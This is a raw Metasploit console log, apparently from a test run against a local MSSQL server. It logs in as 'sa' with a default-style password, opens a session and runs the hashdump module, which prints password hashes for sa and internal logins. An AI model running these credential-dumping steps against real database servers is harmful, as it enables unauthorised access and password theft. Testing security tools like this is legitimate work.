use auxiliary/scanner/mssql/mssql_login
Stopping all jobs...
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_schemadump[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> run PASS_FILE= USER_FILE= CreateSession=true username=sa password=yourStrong(!)Password rhost=127.0.0.1 rport=1433 database=master
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> [*] 127.0.0.1:1433        - 127.0.0.1:1433 - MSSQL - Starting authentication scanner.
[!] 127.0.0.1:1433        - No active DB -- Credential data will not be saved!
[+] 127.0.0.1:1433        - 127.0.0.1:1433 - Login Successful: WORKSTATION\sa:yourStrong(!)Password
[*] MSSQL session 4 opened (127.0.0.1:45619 -> 127.0.0.1:1433) at 2024-05-16 08:44:32 +0000
use auxiliary/scanner/mssql/mssql_hashdump
[*] 127.0.0.1:1433        - Scanned 1 of 1 hosts (100% complete)
[*] 127.0.0.1:1433        - Bruteforce completed, 1 credential was successful.
[*] 127.0.0.1:1433        - 1 MSSQL session was opened successfully.
[*] Auxiliary module execution completed
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> run session=4 Verbose=true
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> [*] Using existing session 4
[!] No active DB -- Credential data will not be saved!
[*] Instance Name: "ef5e85b2b9bf"
[+] Saving mssql12 = sa:0x02009DC67651D9B823B5B8C9DF5653B8358DD0439644FDE1046EFA14A98EDFE68DFDFE3477DB41F01C0BC62D3EBC81BA7E45BA3923388113214D258B49D919F750FAD911114F
[+] Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x02001B6FA316A71B8D97707600200328656D5107EBA80B7A94D0D6987CE6798B1EF0050C7CC55AC6EE6AFB643F51383C0C481431BEF59E0B2DF5C03C3D102475770FC9B54A05
[+] Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x0200875CE0A3322E192BF5EE952A44A7AF615CDCE5F135726ED20B31F36E640323B93B39C86E1D4D38E41E0584B7BAF44D3E5FF5147F7A5B30C7665EEF7A0F00F7F6C5540E46
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
sessions -K
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> jobs -K
[*] Killing all sessions...
[*] 127.0.0.1 - MSSQL session 4 closed.
[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> 